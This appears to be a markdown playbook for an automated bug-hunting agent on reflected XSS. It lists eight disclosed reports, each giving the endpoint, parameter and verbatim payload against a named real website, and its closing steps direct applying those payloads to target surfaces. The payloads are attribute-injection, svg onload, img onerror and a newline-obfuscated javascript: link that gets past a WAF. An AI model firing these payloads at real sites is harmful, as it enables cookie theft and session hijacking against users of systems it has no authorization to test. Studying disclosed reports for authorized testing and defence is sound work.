---
name: hunter-l4-reflected-xss
description: "Test and exploit reflected XSS with real payloads from disclosed reports."
domain: cybersecurity
subdomain: web
tags:
- web
- reflected-xss
- hunting
- l4
version: '1.0'
---
# L4 Playbook: Reflected XSS (hunter)

**L3 technique sheet:** `knowledge/sheets/reflected-xss.md` — (exists)

## When to use
Attack a target surface for Reflected XSS. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 139981 [ajaysenr]
- endpoint: `GET /cs/new-york-city/turtle-bay-restaurants/fast-casual/{id}`
- parameter: `URL path`
- payload: `https://www.zomato.com/cs/new-york-city/turtle-bay-restaurants/fast-casual/1zqjrw'/onmouseover='alert(1)'/style='height:200;width:200'/b=`
- root cause: Zomato reflects the URL path into the page without encoding, allowing attribute injection (onmouseover) in the link.
- impact: XSS executed when hovering over the crafted link in Firefox (alert(1) fires via onmouseover).

### 1091165 [ajaysenr]
- endpoint: `GET /learner/ContactUs.aspx/{path}/Signin.aspx`
- parameter: `URL path`
- payload: `http://macademy.mtnonline.com/learner/ContactUs.aspx/(A('onerror='alert%60xElkomy%60'xelkomy))/Signin.aspx`
- root cause: The ContactUs.aspx path segment is reflected unsanitized into the ASPX page, allowing onerror attribute injection.
- impact: XSS payload fired on http://macademy.mtnonline.com (alert executed in Firefox and Chrome), enabling session hijacking, CSRF bypass, ad-jacking, and vi

### 164520 [ajaysenr]
- endpoint: `POST /apps/files comments (edit comment)`
- parameter: `comment`
- payload: `</textarea><script>alert(1)</script>`
- root cause: Comment textarea content is reflected into the page without proper encoding after editing, executing injected HTML/JS.
- impact: XSS payloads fired when a comment was posted and then edited (self-XSS); duplicate of report #164027.

### 1003433 [ajaysenr]
- endpoint: `POST /WaterControl/shefgraph-historic.cfm`
- parameter: `fld_frompor`
- payload: `1"--><Svg OnLoad=(confirm)(1)<!--`
- root cause: The fld_frompor form value was reflected into the page without sanitization, allowing injected markup to execute as script in the victim's browser.
- impact: Payload was reflected and executed (confirm dialog) in the victim's browser; attacker could perform any action, view any information, or modify data t

### 1010316 [ajaysenr]
- endpoint: `GET /{path}`
- parameter: `url`
- payload: `N/A (payload redacted in report)`
- root cause: The url parameter was reflected without escaping, bypassing the prior fix (#1002977).
- impact: JS executes in the victim's browser (alert popup proven via timestamped video).

### 1012249 [ajaysenr]
- endpoint: `POST /search`
- parameter: `keyword`
- payload: `<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>`
- root cause: The keyword POST parameter was reflected without encoding; newline obfuscation bypassed the WAF.
- impact: JS executes in the victim's browser (alert(document.domain) popup); cookie theft / page content modification possible.

### 1028396 [ajaysenr]
- endpoint: `GET /conferences/get_recording_slides_xml.xml`
- parameter: `url`
- payload: `https://events.hackerone.com/conferences/get_recording_slides_xml.xml?url=myserver/xss.xml`
- root cause: The url parameter content is reflected into the response/XML without sanitization.
- impact: Reflected XSS demonstrated via the url parameter (program-confirmed); the affected system did not contain HackerOne report data.

### 1029668 [ajaysenr]
- endpoint: `product review submission (Product Reviews app)`
- parameter: `email`
- payload: `"><img src=a onerror=alert(1)>123@sdf.com`
- root cause: An unauthenticated visitor's email input is reflected onto the product page without sanitization for certain shop configurations.
- impact: An unauthenticated user reflected and executed JavaScript on a store's product page (proven by alert).

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

